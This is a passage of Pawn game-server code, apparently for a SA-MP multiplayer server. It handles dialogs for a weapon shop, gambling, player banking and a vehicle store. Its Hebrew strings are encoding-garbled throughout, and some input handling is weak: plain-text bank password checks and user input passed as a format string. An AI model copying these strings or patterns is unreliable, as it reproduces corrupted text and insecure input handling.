						format(string,sizeof(string),"PlayerWeapon%d",Ammunation[wid][aSlot]);
						fsetint(fuser(playerid),string,Ammunation[wid][aID]);
						if(Ammunation[wid][aSlot] != 8 && Ammunation[wid][aSlot] != 9)
						{
							format(string,sizeof(string),"PlayerAmmo%d",Ammunation[wid][aSlot]);
							fsetint(fuser(playerid),string,playerinfo[playerid][ammo][Ammunation[wid][aSlot]]);
						}
					}
				}
				format(string,sizeof(string),@c(green) "!%s °ы∙· р· фчсщьф",AmmunationSales[listitem][asName]);
				ShowPlayerDialog(playerid,dialog_ammusaleerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· юсЎЄщэ",string,"чцх°","");
			}
			else ShowPlayerConstDialog(playerid,dialog_ammu);
		}
		case dialog_gamble: if(response) switch(listitem)
		{
			/*case gambling_npc:
			{
				switch(random(2))
				{
					case 0: string = "ыря ·хыь ьфю° Єь ыёє. ьъ ьЎу щющя рх ∙юрь";
					case 1: string = "!чх∙с ∙щ∙ ьъ юць фщхэ? цхц ьщющя рх ь∙юрь";
				}
				format(talkBubble,sizeof(talkBubble),string);
				GamblingGuyTalk(string,playerid,1,1);
			}*/
			case gambling_money: ShowPlayerDialog(playerid,dialog_gamblingmoney,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(green) "$ ?чх∙с ∙щ∙ ьъ юць фщхэ $\n\n" @c(yellow) "!сч° ёыхэ ∙ь ыёє ьфю° Єьщх. фёыхэ ∙·сч° щщьўч ююъ, хрэ щ∙ ьъ юць - щхчц° рьщъ Їщ 2","GO!","ётх°");
			case gambling_machine: ShowPlayerDialog(playerid,dialog_gamblingmachine,DIALOG_STYLE_INPUT,@c(lightblue) "фщюх°щэ",@c(green) "$ ?чх∙с ∙щ∙ ьъ юць фщхэ $\n\n" @c(yellow) "GO! фўьу ёыхэ ыёє ∙р·ф юЄхЁщщя ьфю° Єьщх хрц ьчї\nХ !!!рэ ∙ьх∙ ф·юхЁх· цфх·, ёыхэ ффщюх° щхыЇь Їщ 3\n\n" @c(red) "...ьф·чьф GO! ьчї","GO!","ётх°");
		}
		case dialog_addons:
		{
			if(response)
			{
				if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
				playerinfo[playerid][clickon] = listitem;
				new fullinfo[650];
				format(fullinfo,sizeof(fullinfo),@c(lightred) "∙э ф·хёє\n" @c(white) "%s",AmmunationSpecialItems[listitem][aiName]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ючщ°\n" @c(white) "%d$",fullinfo,AmmunationSpecialItems[listitem][aiCost]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "°юф у°х∙ф\n" @c(white) "%d",fullinfo,AmmunationSpecialItems[listitem][aiLevel]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "юёЇ° ЇЄющ ∙щюх∙\n" @c(white) "%d",fullinfo,AmmunationSpecialItems[listitem][aiAmmo]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ющуЄ",fullinfo);
				switch(listitem)
				{
					case ai_laser:
					{
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) "/laser :фьщщц° ьЁ∙ў Ёщ·я ьфЇЄьф срюЎЄх· фЇўхуф",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".фхр щхыь ьЄцх° ьъ ьыххя хьф°рх· ь∙чўЁщэ с∙°· ∙р·ф юыххя Єьщфэ р· фЁ∙ў",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(red) "∙щэ ьс: ·хыь ьф∙·ю∙ с·хёє цф ыюёЇ° ЇЄющ ф∙щюх∙ ∙щ∙ ьъ. сыь ЇЄэ ∙·сЎЄ р· фЇўхуф, ··сцсц ЇЄэ рч·",fullinfo);
					}
					case ai_armour:
					{
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".сыь ЇЄэ ∙·чцх° ьчщщэ ·ўсь ютя срхЇя рхшхюшщ сющуф хщ∙ ьъ ютя ·ющущ",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(red) "∙щэ ьс: ·хыь ьф∙·ю∙ с·хёє цф ыюёЇ° ЇЄющ ф∙щюх∙ ∙щ∙ ьъ. сыь ЇЄэ ∙··чщь ь∙чў, ··сцсц ЇЄэ рч·",fullinfo);
					}
					case ai_jetpack:
					{
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) "/jetp :·щў ёщьхя юрЇ∙° ьъ ьЄхє сюфщ°х· ёсщ°ф ыюЄш ьыь юўхэ ∙·°Ўф, срюЎЄх· фЇўхуф",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(red) "∙щэ ьс: ·хыь ьф∙·ю∙ с·хёє цф ыюёЇ° ЇЄющ ф∙щюх∙ ∙щ∙ ьъ. сыь ЇЄэ ∙·сЎЄ р· фЇўхуф, ··сцсц ЇЄэ рч·",fullinfo);
					}
					case ai_bugarmour:
					{
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".Sawnoff Shotgun ютя сртщэ фхр ютя хщ°шхрьщ юфсрт фщухЄ ∙Ёў°р \"∙щш· ф2-2\" сЁ∙ў",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".Ёщ·я ьўЁх· ютя ∙щт°хэ ьыъ ∙с°тЄ ∙щщ°х съ срюЎЄх· ф∙щшф фцх, фчщщэ ∙ьъ °ў щ·юьрх хьр щ°ух",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".Єэ цр· - ющ ∙ўхЁф р· фютя ьр щхыь ьф∙·ю∙ с∙щш· ф2-2 сЄЎюх",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) "/bugarm :ьфЇЄь· рх сщшхь ютя фсртщэ ф∙·ю∙х сЇўхуф",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(red) "∙щэ ьс: ·хыь ьф∙·ю∙ с·хёє цф ыюёЇ° ЇЄющ ф∙щюх∙ ∙щ∙ ьъ. сыь ЇЄэ ∙щщ°х съ с2-2, ··сцсц ЇЄэ рч·",fullinfo);
					}
					case ai_infinitecmd:
					{
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ".·хёє цф юрЇ∙° ьъ ьсЎЄ Їўхух· юёхщщюх· с°юф фрщЁёхЇщ·",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ";су°ъ ыьь, чьў юфЇўхух· ь°юх· фя ырьф ∙Ёщ·я ьсЎЄ ЇЄэ рч· Єу ∙ю·щэ",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(grey) ":·хёє фЇўхух· фрщЁёхЇщх· щрЇ∙° ьъ ьф∙·ю∙ ЇЄющэ чхц°х· сЇўхух· тэ сьщ ьюх·. ·ўє Єсх° фЇўхух· фсрх·",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(yellow) " /kiss /fix /flix /turbo",fullinfo);
						format(fullinfo,sizeof(fullinfo),"%s\n" @c(red) "∙щэ ьс: сыь ЇЄэ ∙·сЎЄ р· рч· юфЇўхух· щх·° юЇЄэ рч· сёЇрхя, ··сцсц ЇЄэ рч·",fullinfo);
					}
				}
				ShowPlayerDialog(playerid,dialog_addonbuy,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ·хёЇщэ",fullinfo,"ўЁф","чцх°");
			}
			else ShowPlayerConstDialog(playerid,dialog_ammu);
		}
		case dialog_addonbuy:
		{
			if(response)
			{
				if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
				new id = playerinfo[playerid][clickon];
				if(playerinfo[playerid][level] < AmmunationSpecialItems[id][aiLevel])
				{
					format(string,sizeof(string),@c(red) " .сыущ ьўЁх· р· ф·хёє фцф Єьщъ ьфщх· с°юф %d",AmmunationSpecialItems[id][aiLevel]);
					return ShowPlayerDialog(playerid,dialog_addonserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ·хёЇщэ",string,"чцх°","");
				}
				if(GetMoney(playerid) < AmmunationSpecialItems[id][aiCost]) return ShowPlayerDialog(playerid,dialog_addonserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ·хёЇщэ",@c(red) ".рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· ф·хёє фцф","чцх°","");
				GiveMoney(playerid,0-AmmunationSpecialItems[id][aiCost]);
				if(id == ai_armour) SetPlayerArmour(playerid,100.0);
				new bought[256];
				if(playerinfo[playerid][ammuitems][id]) format(bought,sizeof(bought),"!\"ўЁщ· \"%s\n\n" @c(grey) "∙щэ ьс: " @c(white) "ўЁщ· Єху %d ЇЄющ ∙щюх∙ ьюхЎ° цф",AmmunationSpecialItems[id][aiName],AmmunationSpecialItems[id][aiAmmo]);
				else format(bought,sizeof(bought),"!\"ўЁщ· \"%s\n\n" @c(grey) "∙щэ ьс: " @c(white) "·хыь ьф∙·ю∙ сюхЎ° цф Єу %d ЇЄющэ сьсу, рьр рэ ·ўЁф рх·х ∙хс",AmmunationSpecialItems[id][aiName],AmmunationSpecialItems[id][aiAmmo]);
				format(bought,sizeof(bought),"%s\n/stats :ЎЇф сёшршё ∙ьъ Єь юЁ· ь°рх· ыюф ЇЄющэ ·хыь ьф∙·ю∙ с·хёє цф",bought);
				ShowPlayerDialog(playerid,dialog_addonserr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· ·хёЇщэ",bought,"чцх°","");
				playerinfo[playerid][ammuitems][AmmunationSpecialItems[id][aiID]] = true, playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[id][aiID]] += AmmunationSpecialItems[id][aiAmmo];
				if(playerinfo[playerid][logged])
				{
					format(string,sizeof(string),"AmmuItem%d",AmmunationSpecialItems[id][aiID]);
					fsetint(fuser(playerid),string,playerinfo[playerid][ammuitemammo][AmmunationSpecialItems[id][aiID]]);
				}
			}
			else ShowPlayerConstDialog(playerid,dialog_addons);
		}
		case dialog_addonserr: if(response) ShowPlayerConstDialog(playerid,dialog_addons);
		case dialog_spw:
		{
			if(response)
			{
				if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
				new id = (playerinfo[playerid][clickon] = listitem + 1), fullinfo[450];
				format(fullinfo,sizeof(fullinfo),@c(lightred) "∙э фЁ∙ў\n" @c(white) "%s",spAmmunation[id][spaName]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ющуЄ\n" @c(white) "%s",fullinfo,spAmmunation[id][spaText]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ючщ°\n" @c(white) "%d$",fullinfo,spAmmunation[id][spaCost]);
				format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "°юф у°х∙ф\n" @c(white) "%d",fullinfo,spAmmunation[id][spaLevel]);
				if(spAmmunation[id][spaWeapon] > 0)
				{
					format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "ухюф ьЁ∙ў\n" @c(white) "%s",fullinfo,WeaponName(spAmmunation[id][spaWeapon]));
					format(fullinfo,sizeof(fullinfo),"%s\n" @c(lightred) "юёЇ° ыух°щэ\n" @c(white) "%d",fullinfo,spAmmunation[id][spaAmmo]);
				}
				ShowPlayerDialog(playerid,dialog_spwbuy,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ ющхчущэ",fullinfo,"ўЁф","чцх°");
			}
			else ShowPlayerConstDialog(playerid,dialog_ammu);
		}
		case dialog_spwbuy:
		{
			if(response)
			{
				if(GetPlayerCheckpoint(playerid) != cp_ammu || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фЁ∙ўщэ сыущ ьсЎЄ Їўхуф цх");
				new id = playerinfo[playerid][clickon];
				if(playerinfo[playerid][level] < spAmmunation[id][spaLevel])
				{
					format(string,sizeof(string)," .сыущ ьўЁх· р· фЁ∙ў фющхчу фцф Єьщъ ьфщх· ьЇчх· с°юф %d",spAmmunation[id][spaLevel]);
					return ShowPlayerDialog(playerid,dialog_spwerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ ющхчущэ",string,"чцх°","ётх°");
				}
				if(GetMoney(playerid) < spAmmunation[id][spaCost])
				{
					format(string,sizeof(string)," .рщя ьъ юёЇщў ыёє сыущ ьўЁх· р· фЁ∙ў фющхчу фцф, фхр Єхьф $%d",spAmmunation[id][spaCost]);
					return ShowPlayerDialog(playerid,dialog_spwerr,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ ющхчущэ",string,"чцх°","ётх°");
				}
				if(playerinfo[playerid][spweapon] != spw_none && playerinfo[playerid][spweapon] != id) DropSPW(playerid);
				playerinfo[playerid][spweapon] = id;
				if(spAmmunation[id][spaAmmo] > 0)
				{
					DefineSPWGun(playerid,id,1);
					SetPlayerArmedWeapon(playerid,spAmmunation[id][spaWeapon]);
					DefineSPWObject(playerid,id,1);
					playerinfo[playerid][spwammo] += spAmmunation[id][spaAmmo];
				}
				else playerinfo[playerid][spwammo] = spAmmunation[id][spaAmmo];
				GiveMoney(playerid,0-spAmmunation[id][spaCost]);
				if(playerinfo[playerid][logged] && spAmmunation[id][spaSaved]) fsetint(fuser(playerid),"SpecialWeapon",id);
				format(string,sizeof(string),@c(green) "!%s ўЁщ· р· фЁ∙ў фющхчу\n.∙щэ ьс: рэ ·ўЁф Ё∙ў ющхчу рч°, фЁ∙ў ∙ўЁщ· Єы∙щх щючў",spAmmunation[id][spaName]);
				ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ўЁщщ· Ё∙ўщэ ющхчущэ",string,"OK","");
			}
			else ShowPlayerConstDialog(playerid,dialog_spw);
		}
		case dialog_spwerr: if(response) ShowPlayerConstDialog(playerid,dialog_spw);
		case dialog_clickplayer: if(response)
		{
			switch(GetPlayerCheckpoint(playerid))
			{
				case cp_bank:
				{
					format(string,sizeof(string)," %s // юЄ°ы· сЁў",GetName(playerinfo[playerid][clickplayer]));
					ShowPlayerDialog(playerid,dialog_clickplayer,DIALOG_STYLE_LIST,string,"фЄс° ыёє\nфхЎр ыёє юч∙схя фсЁў ∙ь фю∙·ю∙ фцф\nсухў р· ёыхэ фыёє сч∙схя фсЁў ∙ь ю∙·ю∙ цф","сч°","ётх°");
					switch(listitem)
					{
						case 0:
						{
							format(string,sizeof(string)," %s // фЄс°· ыёє",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_transfer,DIALOG_STYLE_INPUT,string,":°∙хэ ыря р· ёыхэ фыёє ∙с°ЎхЁъ ьфЄсщ° рь ∙чўя цф","фЄс°","сщшхь");
						}
						case 1:
						{
							if(!playerinfo[playerinfo[playerid][clickplayer]][bankshare]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф рщЁх ю∙·є р· ч∙схя фсЁў ∙ьх");
							format(string,sizeof(string)," %s // фхЎр· ыёє юч∙схя сЁў ∙ь ю∙·ю∙ рч°",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_baccw1,DIALOG_STYLE_INPUT,string,":°∙хэ ыря р· ёщёю· фсЁў ∙ь ю∙·ю∙ цф","фю∙ъ","ётх°");
						}
						case 2:
						{
							if(!playerinfo[playerinfo[playerid][clickplayer]][bankshare]) return SendClientMessage(playerid,red," .ю∙·ю∙ цф рщЁх ю∙·є р· ч∙схя фсЁў ∙ьх");
							format(string,sizeof(string)," %s // сущў· ёыхэ фыёє сч∙схя сЁў ∙ь ю∙·ю∙ рч°",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_baccb,DIALOG_STYLE_INPUT,string,":°∙хэ ыря р· ёщёю· фсЁў ∙ь ю∙·ю∙ цф","фю∙ъ","ётх°");
						}
					}
				}
				default:
				{
					switch(listitem)
					{
						case 0: ShowStats(playerid,playerinfo[playerid][clickplayer]);
						case 1:
						{
							if(playerinfo[playerid][clickplayer] == playerid) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," ∙ьщч· фхуЄф Ї°шщ·"," .ьр Ёщ·я ь∙ьхч фхуЄф Ї°шщ· ьЄЎюъ","ётх°","");
							format(string,sizeof(string)," %s // ∙ьщч· фхуЄф Ї°шщ·",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_pm,DIALOG_STYLE_INPUT,string,":°∙хэ р· ффхуЄф фЇ°шщ· ыря","∙ьч","сщшхь");
						}
						case 2:
						{
							format(string,sizeof(string)," %s // ∙ьщч· ущххч ьрующЁщэ",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_report,DIALOG_STYLE_INPUT,string,":°∙хэ ыря р· фущххч","уххч","сщшхь");
						}
						case 3:
						{
							format(string,sizeof(string)," %s // ∙ьщч· ыёє",GetName(playerinfo[playerid][clickplayer]));
							ShowPlayerDialog(playerid,dialog_pay,DIALOG_STYLE_INPUT,string,":°∙хэ ыря р· ёыхэ фыёє ∙с°ЎхЁъ ь∙ьхч рь ∙чўя цф","∙ьч","сщшхь");
						}
						case 4:
						{
							format(string,sizeof(string),"/profile %d",playerinfo[playerid][clickplayer]);
							command(playerid,string);
						}
						case 5: if(IsPlayerMAdmin(playerid))
						{
							playerinfo[playerid][range] = 0.0, playerinfo[playerid][attype] = at_player;
							ShowPlayerConstDialog(playerid,dialog_admintotal);
						}
					}
				}
			}
		}
		#if hanukkah_now
		case dialog_hanukkah: if(response)
		{
		    if(!CanBeTeleported(playerid)) return SendClientMessage(playerid, red, " .рщЁъ щыхь ьф∙·ю∙ счЁх· фёхЇтЁщх· сюЎсъ фЁхычщ");
			if(donutshop[listitem][dprice] > playerinfo[playerid][donut])
			{
			    SendClientMessage(playerid, red, " .рщя ьъ юёЇщў ёхЇтЁщх· ь°ыщ∙· юхЎ° цф");
			    return ShowPlayerConstDialog(playerid, dialog_hanukkah);
			}
			donut_sell(playerid, listitem);
		}
		case dialog_hanukkah2:
		{
		    if(response) donut_spc(playerid);
		    else SendClientMessage(playerid, red, " .сч°· ь∙юх° р· °ысъ фЁхычщ");
		}
		#endif
		case dialog_pm: if(response)
		{
			format(string,sizeof(string),"/pm %d %s",playerinfo[playerid][clickplayer],inputtext);
			command(playerid,string);
		}
		case dialog_report: if(response)
		{
			format(string,sizeof(string),"/report %d %s",playerinfo[playerid][clickplayer],inputtext);
			command(playerid,string);
		}
		case dialog_pay: if(response)
		{
			if(!IsNumeric(inputtext) || strval(inputtext) < 0 || strval(inputtext) > GetMoney(playerid)) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," ∙ьщч· ыёє",".ёыхэ ∙тхщ","OK","");
			format(string,sizeof(string),"/pay %d %s",playerinfo[playerid][clickplayer],inputtext);
			command(playerid,string);
		}
		case dialog_transfer: if(response)
		{
			if(!IsNumeric(inputtext) || strval(inputtext) < 1 || strval(inputtext) > playerinfo[playerid][bank]) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX," фЄс°· ыёє",".ёыхэ ∙тхщ","OK","");
			format(string,sizeof(string),"/transfer %d %s",playerinfo[playerid][clickplayer],inputtext);
			command(playerid,string);
		}
		case dialog_baccw1: if(response)
		{
			format(string,sizeof(string)," %s // фхЎр· ыёє юч∙схя сЁў ∙ь ю∙·ю∙ рч°",GetName(playerinfo[playerid][clickplayer]));
			if(!equal(inputtext,fgetstring(fuser(playerinfo[playerid][clickplayer]),"BankPassword"))) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,".ёщёю· ч∙схя ∙тхщф","OK","");
			format(playerinfo[playerid][lastinputtext],32,inputtext);
			ShowPlayerDialog(playerid,dialog_baccw2,DIALOG_STYLE_INPUT,string," :°∙хэ ыря р· фёыхэ ∙с°ЎхЁъ ьфхЎщр юч∙схя сЁў цф","фхЎр","сщшхь");
		}
		case dialog_baccw2: if(response)
		{
			if(!IsNumeric(inputtext) || strval(inputtext) < 1 || strval(inputtext) > playerinfo[playerinfo[playerid][clickplayer]][bank])
			{
				format(string,sizeof(string)," %s // фхЎр· ыёє юч∙схя сЁў ∙ь ю∙·ю∙ рч°",GetName(playerinfo[playerid][clickplayer]));
				return ShowPlayerDialog(playerid,dialog_baccw3,DIALOG_STYLE_MSGBOX,string,".ёыхэ ∙тхщ","Ёёф ∙хс","ётх°");
			}
			format(string,sizeof(string),"/pwithdraw %s %s %d",GetName(playerinfo[playerid][clickplayer]),playerinfo[playerid][lastinputtext],strval(inputtext));
			command(playerid,string);
		}
		case dialog_baccw3: if(response) ShowPlayerDialog(playerid,dialog_baccw2,DIALOG_STYLE_INPUT,string," :°∙хэ ыря р· фёыхэ ∙с°ЎхЁъ ьфхЎщр юч∙схя сЁў цф","фхЎр","сщшхь");
		case dialog_baccb: if(response)
		{
			if(!equal(inputtext,fgetstring(fuser(playerinfo[playerid][clickplayer]),"BankPassword")))
			{
				format(string,sizeof(string)," %s // сущў· ёыхэ фыёє сч∙схя сЁў ∙ь ю∙·ю∙ рч°",GetName(playerinfo[playerid][clickplayer]));
				return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,string,".ёщёю· ч∙схя ∙тхщф","OK","");
			}
			format(string,sizeof(string),"/pbalance %s %s",GetName(playerinfo[playerid][clickplayer]),inputtext);
			command(playerid,string);
		}
		case dialog_upowers: if(response)
		{
			new uinfo[256];
			format(uinfo,sizeof(uinfo),"%s%s\n\n$%d :ючщ°\n%d :°юф\n%s :рьюЁш\n%d :ёъ фыь °юх· ыхч\n\n/upower buy %d :ьўЁщщф",UltimatePowers[listitem][upColor],UltimatePowers[listitem][upText],UltimatePowers[listitem][upCost],UltimatePowers[listitem][upBuyLevel],UltimatePowers[listitem][upElement],GetUltimatePowerMaxLevel(listitem),listitem+1);
			ShowPlayerDialog(playerid,dialog_upowerinfo,DIALOG_STYLE_MSGBOX,UltimatePowers[listitem][upTitle],uinfo,"чцх°","ётх°");
		}
		case dialog_upowerinfo: if(response) command(playerid,"/upower list");
		case dialog_vlist: if(response)
		{
			if(GetPlayerCheckpoint(playerid) != cp_vstore || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· °ысщэ ыь∙фщ· ьсщЎхЄ фЇЄхьф фцх");
			new s = cpinfo[playerinfo[playerid][cp]][cpstoreid], dialogHeader[64];
			format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "%s | чЁх· ф%s",GetVehicleName(vstoreinfo[s][vstore_vehicles][listitem]),cpinfo[playerinfo[playerid][cp]][cpname]);
			format(string,sizeof(string),@c(yellow) "ЎЇщщф с°ыс\n" @c(yellow) "(ўЁщщф ($%d\n" @c(yellow) "ўЁщщф сы°шщё р∙°рщ",vstoreinfo[s][vstore_costs][listitem]);
			playerinfo[playerid][vlistdia][0] = s, playerinfo[playerid][vlistdia][1] = listitem;
			ShowPlayerDialog(playerid,dialog_vlist2,DIALOG_STYLE_LIST,dialogHeader,string,"сч°","чцх°");
		}
		case dialog_vlist2: if(response)
		{
		    if(GetPlayerCheckpoint(playerid) != cp_vstore || !IsPlayerInCheckpoint(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· °ысщэ ыь∙фщ· ьсщЎхЄ фЇЄхьф фцх");
			new s = playerinfo[playerid][vlistdia][0], v = playerinfo[playerid][vlistdia][1];
			switch(listitem)
			{
				case 0: // view
				{
					SavePlayerPos(playerid);
					new world = GetEmptyWorld(), v_ = CreateVehicleEx(vstoreinfo[s][vstore_vehicles][v],vstoreinfo[s][vstore_center][0],vstoreinfo[s][vstore_center][1],vstoreinfo[s][vstore_center][2],vstoreinfo[s][vstore_center][3],-1,-1,respawntime,0,world);
					SetPlayerInterior(playerid,0);
					SetPlayerVirtualWorld(playerid,world);
					playerinfo[playerid][viewingvehicle] = v_;
					TogglePlayerSpectating(playerid,1);
					PlayerSpectateVehicle(playerid,v_);
					format(string,sizeof(string)," ." @c(red) "%s" @c(yellow) " р·ф ыЄ· ЎхЇф с°ыс",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
					SendClientMessage(playerid,yellow,string);
					SendClientMessage(playerid,yellow," .ьчї Єь " @c(lightyellow) "юў∙ фыЁщёф ь°ыс" @c(yellow) " Єь юЁ· ьёхсс р· ф°ыс с-90 юЄьх·");
					SendClientMessage(playerid,yellow," .ьчї Єь " @c(lightyellow) "ыь юў∙ рч°" @c(yellow) " ьфЇёў· фЎЇщщф");
				}
				case 1: // buy
				{
					new dialogHeader[64];
					format(dialogHeader,sizeof(dialogHeader),@c(lightblue) "%s | чЁх· ф%s",GetVehicleName(vstoreinfo[s][vstore_vehicles][v]),cpinfo[playerinfo[playerid][cp]][cpname]);
					if(playerinfo[playerid][vehicle][0] != 0 && vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 3) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV :ыс° щ∙ ьъ °ыс ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(playerinfo[playerid][vehicle][3] != 0 && vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 3) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV2 :ыс° щ∙ ьъ °ыс ∙Ёщ ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(playerinfo[playerid][vehicle][5] != 0 && vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 1) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " /SellV3 :ыс° щ∙ ьъ °ыс ∙ьщ∙щ ∙ўЁщ·, ыущ ьюых° рх·х °∙хэ р· фЇўхуф","чцх°","ётх°");
					if(GetMoney(playerid) < vstoreinfo[s][vstore_costs][v]) return ShowPlayerDialog(playerid,dialog_vlist3,DIALOG_STYLE_MSGBOX,dialogHeader,@c(red) " .рщя ьъ юёЇщў ыёє","чцх°","ётх°");
					GiveMoney(playerid,0-vstoreinfo[s][vstore_costs][v], 39);
					//SPropertyEarnings(3,vstoreinfo[s][vstore_costs][v],25);
					if(vstoreinfo[s][vstore_type] != 2 && vstoreinfo[s][vstore_type] != 3)
					{
						playerinfo[playerid][vehicle][0] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][2] = vstoreinfo[s][vstore_costs][v];
						for(new i = 0; i < 2; i++) playerinfo[playerid][pvcol][i] = random(126);
						playerinfo[playerid][pvpj] = 0;
						for(new i = 0; i <= 13; i++) playerinfo[playerid][pvmod][i] = 0;
						playerinfo[playerid][fuel] = GetVehicleFuel(playerinfo[playerid][vehicle][0]);
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"VehicleCost",vstoreinfo[s][vstore_costs][v]);
							fsetint(fuser(playerid),"VehicleColor1",playerinfo[playerid][pvcol][0]);
							fsetint(fuser(playerid),"VehicleColor2",playerinfo[playerid][pvcol][1]);
							fsetint(fuser(playerid),"VehiclePJ",playerinfo[playerid][pvpj]);
							fsetint(fuser(playerid),"VehicleFuel",playerinfo[playerid][fuel]);
						}
						format(string,sizeof(string)," ~~~ :" @c(white) "[%s]" @c(lightblue) " с-$%d %s ўЁщ· р· ф°ыс ~~~",GetDateAsString(),vstoreinfo[s][vstore_costs][v],GetVehicleName(vstoreinfo[s][vstore_vehicles][v]));
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,orange," * /CallV" @c(yellow) " :ь∙щтх° ф°ыс рьщъ");
						SendClientMessage(playerid,orange," * /VMod" @c(yellow) " :ь∙ющ°· ЎсЄ рх ∙щЇх°щэ ·ющущщэ ь°ыс");
					}
					if(vstoreinfo[s][vstore_type] != 1 && vstoreinfo[s][vstore_type] != 3)
					{
						playerinfo[playerid][vehicle][3] = vstoreinfo[s][vstore_vehicles][v], playerinfo[playerid][vehicle][1] = -1, playerinfo[playerid][vehicle][4] = vstoreinfo[s][vstore_costs][v];
						for(new i = 0; i < 2; i++) playerinfo[playerid][pvcol2][i] = random(126);
						if(playerinfo[playerid][logged])
						{
							fsetint(fuser(playerid),"PVehicle2",vstoreinfo[s][vstore_vehicles][v]);
							fsetint(fuser(playerid),"Vehicle2Cost",vstoreinfo[s][vstore_costs][v]);
							fsetint(fuser(playerid),"Vehicle2Color1",playerinfo[playerid][pvcol2][0]);
							fsetint(fuser(playerid),"Vehicle2Color2",playerinfo[playerid][pvcol2][1]);
						}
